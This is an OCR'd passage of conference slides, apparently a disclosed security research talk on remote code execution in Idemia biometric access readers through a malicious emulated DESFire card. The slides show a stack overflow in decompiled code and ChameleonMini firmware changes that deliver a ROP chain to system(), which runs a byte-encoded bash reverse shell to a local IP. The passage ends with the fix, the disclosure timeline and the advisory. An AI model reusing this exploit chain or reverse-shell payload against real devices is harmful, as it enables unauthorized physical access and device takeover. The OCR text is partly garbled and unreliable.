PUBLIC

## Slide 49

# **<u>Exploitation</u>**

**49**

PUBLIC

## Slide 50

# **<u>Exploitation</u>**

Remote Code Execution

### **Hardening**

**50**

PUBLIC

## Slide 51

# **<u>Exploitation</u>** Remote Code Execution

**51**

PUBLIC


> Recovered by OCR — confidence 83/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1 lint _fastcall Desfire_GetVersion(_DWORD *a1)
2
3| size_t v2; // r4
4) int v3; // ro
5| _intié v4; //
6
7
8
9
int result; //
int v6; //
int v7; //
int v8; // x
10| int v9; // ro
11| int v10; // r12
12| int v11; //r
13) int vi2; //
14| size_t recv_length; // [sp+4h] [bp-124h] BYREF
15| char recv_buffer[256]; // [sp+8h] [bp-120h] BYREF
17| recv_length = 1;
18) if (al)
19 memset (al, 0, 0x1Cu);
20 desfire_ctx.xfer_length = 1
21| desfire_ctx.xfer_buffer[0]
22 while (1)
= 0x60;
23) {
24 v3 Desfire_Command(0, 0x23u) ;
27 return v4;
28 v2 = recv_length + desfire_ctx.xfer_length;
29 memepy (&recv_buffer[recv_length], &desfire_ctx.xfer_buffer[1], desfire_ctx.xfer_length - 1);
31 if ( desfire_ctx.xfer_buffer[0] != OxAF )
32 break
33 desfire_ctx.xfer_length = 1;
34) }
35| recv_buffer[0] = 0;
36 v6 Desfire_VerifyCmacRecv(recv_buffer, &recv.
37| v4 = v6;
38| if (v6)
39 return v4;
40) 4f ( recv_l
41 return
42) af ( tal )
43 return v4;
44| v7 = *(_DWORD *)érecv_buffer[5];
45 *(_DWORD *)&recv_buffer[9];
46 *(_DWORD *)&recv_buffer[1];
47) al[1) = v7;
48| v9 = *(_DWORD *)érec
49| al[2] = v8;
_buffer[17];
50 *(_DWORD *)&érecv_buffer[13];
54 °
57| al[6] = vi2;
59 |}
003E8528 Desfire_GetVersion:42 (3F8528)
4
51
```

## Slide 52

**<u>Exploitation</u>** Remote Code Execution

### **Real hardening**

■

No presence of `-fstack-protector` in the CFLAGS

**52**

PUBLIC

## Slide 53

# **<u>Exploitation</u>** Remote Code Execution

##### **Tooling**

**53**

PUBLIC


> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Tooling
PROXGRIND
ChameleonTiny
Professional
PROXGRIND CHAMELEONTINY
€142°
World's smallest portable RFID emulation multi-tool.
Emulate multiple tags and tag types, sniff, crack and
infiltrate with this keyring sized device.
Comes in two versions; the Pro version is fully wireless.
Version
Pro (With Bluetoott
Quantity
NOTIFY ME WHEN IN STOCK
53
```

## Slide 54

# **<u>Exploitation</u>** Remote Code Execution

### **Opensource Firmware**

**54**

PUBLIC


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Opensource Firmware
Public
Q Notifications & Fork 369
<> Code © Issues 58 [1 Pullrequests 12 © Actions fF Projects OJ wiki © Security
P master ~
DOocsooo 0000 00 0 000
Tomaspre Support Gallagher when using make desfire
DESFireApplicationDirectory.c
DESFireApplicationDirectory.h
DESFireChameleonTerminal.c
DESFireChameleonTerminal.h
DESFireChameleonTerminalinclude.c
DESFireCrypto.c
DESFireCrypto.h
DESFireCryptoTests.h
DESFireFile.c
DESFireFile.h
DESFireFirmwareSettings.h
DESFirelSO14443Support.c
DESFirelSO14443Support.h
DESFirelSO7816Support.c
DESFirelSO7816Support.h
DESFireinstructions.c
ChameleonMini / Firmware / Chameleon-Mini / Application / DESFire /
Fix key read and write for keys with different numbers than zero
Support Gallagher when using make desfire
Restore point for changes to the CLUCL2 exchanges in the anticollisi
New DF_ENCMODE command to set ECB/CBC crypto modes ; incre.
New DF_ENCMODE command to set ECB/CBC crypto modes ; Incre.
DESFire: Reset IV only when needed
Multiple code cleanup changes to TransferState — Enc of transfers is
Fixing commented multi-line macro in violation of the make style gu
Various debug messages + various fixes
Several fixes to responsiveness and frozen behavior noted in PR #319
Updates to LibNFC test code (ISO auth works) ; Untested changes to f.
Reset selected AID to 000000 after WUPA
Smalll changes to the NAKJACK return size (4 bits versus 1 byte)
Restore point for changes to the CLUCL2 exchanges in the anticollisi
Restore point for changes to the CLUCL2 exchanges in the anticollisi
Return correct error code when file index is out of range
Several fixes to responsiveness and frozen behavior noted in PR #319
Go to file
3 months ago
3 months ago
6 months ago
6 months ago
6 months ago
3 months ago
6 months ago
last year
3 months ago
7 months ago
6 months ago
3 months ago
6 months ago
6 months ago
6 months ago
3 months ago
7 months ago
54
```

## Slide 55

# **<u>Exploitation</u>** Remote Code Execution

##### **Exploitation strategy**

**55**

PUBLIC


> Recovered by OCR — confidence 76/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation strategy
STACK ROPCHAIN CORE_APP
SP 00572A08 desfire_ctxt
FF 00 00 OOsdeafire ctx DCR OxFF
saved_pc gadget 1 =" POP {R3,R4,R11,PC} 6e G0 60 aot = ;
A08 06 00 00 00+ poo
572R08 66 00 00 00+ Den :
gadget 2 = "LDR RO, [R11,#-0x15C]"
"BL system"
PUBLIC 55
```

## Slide 56

# **<u>Exploitation</u>**

Remote Code Execution

##### **Exploitation strategy**

**56**

PUBLIC


> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation strategy
uint16_t EV0GmdGetVersioni(uint8_t *Buffer, uint16_t ByteCount) {
DEBUG_PRINT_P(PSTR("EV@CmdGetVersion1 : DF_GET_VERSION_frame_counter
DF_GET_VERSION_frame_counter) ;
Buffer[®] = STATUS_ADDITIONAL_FRAME ;
// Buffer[1] Picc.ManufacturerID;
// Buffer[2] = Picc.HwType;
// Buffer[3] = Picc.HwSubtype;
// GetPiccHardwareVersionInfo(&Buffer[4] ) ;
// Buffer[7] = Picc.HwProtocolType;
memset (&Buffer[1], @x42, @x@8);
if (DF_GET_VERSION_frame_counter <= 33)
DF_GET_VERSION_frame_counter+=1;
DesfireState = DESFIRE_GET_VERSION1;
return 9; // bytes length
DF_GET_VERSION_frame_counter=0;
DesfireState = DESFIRE_GET_VERSION2;
return 9;
-- %d\n"),
```

## Slide 57

# **<u>Exploitation</u>**

Remote Code Execution

##### **Exploitation strategy**

**57**

PUBLIC


> Recovered by OCR — confidence 88/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation strategy
uint16_t EV@CmdGetVersion2(uint8_t *Buffer, uint16_t ByteCount) {
DEBUG_PRINT_P(PSTR("EV@CmdGetVersion2:DF_GET_VERSION_frame_counter -- %d\n"),
DF_GET_VERSION_frame_counter) ;
// Buffer[®] = STATUS_ADDITIONAL_FRAME;
// Buffer[1] = Picc.ManufacturerID;3
// Buffer[2] = Picc.SwType;
// Buffer[3] = Picc.SwSubtype;
// GetPiccSoftwareVersionInfo(&Buffer[4]);
// Buffer[7] = Picc.SwProtocolType;
// DesfireState = DESFIRE_GET_VERSION3;
unsigned char ropchain [] = {
@x78, @x@6, @x25, 0x00, // first gadget:
//
DesfireState = DESFIRE_GET_VERSION3;
return 24;
// second gadget:
"POP {R3, R4, R11, PC}"
"LDR R@, R11-@x5c"
"BL system()"
57
```

## Slide 58

# **<u>Exploitation</u>**

Remote Code Execution

##### **Exploitation strategy**

**58**

PUBLIC


> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation #SYNACKTIV
Exploitation strategy
uint16_t EV0CmdGetVersion3(uint8_t *Buffer, uint16_t ByteCount) {
DEBUG_PRINT_P(PSTR("EV@CmdGetVersion3 :DF_GET_VERSION_frame_counter -- %d\n"),
DF_GET_VERSION_frame_counter) ;
// Buffer[@] = STATUS_OPERATION_OK;
// GetPiccManufactureInfo(&Buffer[1]);
unsigned char system_command [] = {
STATUS_OPERATION_OK,
@x35, Ox2a, @x57, 0x00, // ptr(command)
// '/bin/bash -i >& /dev/tcp/192.168.1.42/8080 @>&1\x0'
Ox2f, @x62, @x69, Ox6e, Ox2f, @x62, Ox61, Ox73, 9x68,
Qx65, @x76, Ox2f, @x74, 0x63, @x70, Ox2f, Ox31, 0x39,
memcpy (Buffer, system_command, 1+4+48) ;
DesfireState = DESFIRE_IDLE;
return 1+4+48;
PUBLIC 38
```

## Slide 59

**<u>Exploitation</u>** Remote Code Execution

#### **DEMO**

0:00 / 0:39

h�ps://www.synack�v.com/sites/default/files/2024-05/lucas_georges_open_sesame_demo.mp4

**59**

PUBLIC

## Slide 60

# **<u>Exploitation</u>**

Remote Code Execution

### **Fix**

**60**

PUBLIC


> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Fix
ir...
if (vi2)
MASG_logger: :10g(700,
goto LABEL_21;
(int) "Failed to activate the tag.", (const char *)v22);
if ( Desfire_GetVersion(pVersionInfo) )
MASG_logger::10g(700, (int)"No NXP Mifare!", ;
MASG_logger::10g(700, (int)"A Potential SEOS", dv;
LOWORD(v12) = 16;
ta3 = 16;
ta3 |= 4u;
MASG_logger::10g(700, (int)"A Desfire", a3);
LOWORD(v12) = 4;
goto LABEL_71;
if ( (SAK_1 & 0x20) I= 0 )
if ( sub_3FE674(255, v75, OxFu, (int)pVersionInfo, (int) &v60)
| BYTE1(pVersionInfo[0]) )
if ( sub_3FE674(255, v72, OxFu, (int)pVersionInfo, (int) &v59)
if ( sub_3FDCD4(255) || sub_3FC9A8(v71, (unsigned __int8)v58[0]) || sub_3FDD78(255, v8
MASG_logger: : log (
700,
(int)"A Smart MX with Mifare 4K Desfire Card... but card selection failed 2nd time...",
v17 = 128;
506
507
508
509
510
511
512
513
514
515,
516
517
518
519
520
521
522
523
524
525,
526
527
528
529
530 LABEL_91:
531
532
533
534
535
536
537
538
539
540
541
542
543
544
2 || v73 1= 188 || v74 I= 214)
lect DESfir
Application\n" di
v43 = (const char *)SPROX_Desfire.
eturn code from SPROX_Desfire_SelectApplication:
d\n", v4
MASG_logger: :1og((MASG_logger *)0x2BC, (int)"No NXP Mifare!",
MASG_logger: :1og((MASG_logger *)0x2BC, (int)"A Potential SEOS",
v17 = 16;
LOWORD(v12) = 16;
*a3 = 16;
else
tas |= 4u;
MASG_logger: :1log((MASG_logger *)0x2BC, (int)"A Desfire", a3);
LOWORD(v12) = 4;
if ( v57[0] )
do
while ( v37 < (int) (unsigned __int8)v57[0] );
goto LABEL_19;
6 = (const char *)sub_459644((unsigned __int8)*a6, &v71, (unsigned
__int8)v57[2]);
```

## Slide 61

# **<u>Conclusion</u>**

**61**

PUBLIC

## Slide 62

# **<u>Conclusion</u>**

#### Timeline

- 02-2022: study on contactless informa�on storage

-

   - 06-2022: first vulnerabilites found

- 10-2022: RCE exploited

-

   - 11-2022: vulnerabili�es disclosed to Idemia's CSIRT

- 12-2022 - 01-2023: talks with security people from Idemia

-

   - 05-2023: private firmware fixing the vulnerabili�es

- 09-2023: public firmware fixing the vulnerabili�es and advisory published

**62**

PUBLIC

## Slide 63

# **<u>Conclusion</u>**

Fix and Advisory

**Advisory: https://www.idemia.com/wp-content/uploads/2023/11/Security-Advisory-SA-202305-2.pdf**

### **Versions**

- SIGMA Lite & Lite+, Wide Firmware, Extreme: 4.15.5

- MorphoWave Compact/XP & VisionPass: 2.12.2

- MorphoWave SP: 1.2.7

**63**

PUBLIC

## Slide 64

# **<u>Conclusion</u>**

Final words

- Pre�y good product security overall

■

   - Firmware signature check simple but effec�ve

- Secure boot chain implemented

- UBIFS could be mounted as RO/sealed

-

Lack of run�me userland security, everything running as root

- Fun research target

   - Complete study regarding embedded security

   - Decent impact

   - S�ll a "blue ocean"

**64**

PUBLIC

## Slide 65

**https://www.linkedin.com/company/synacktiv https://twitter.com/synacktiv https://synacktiv.com**
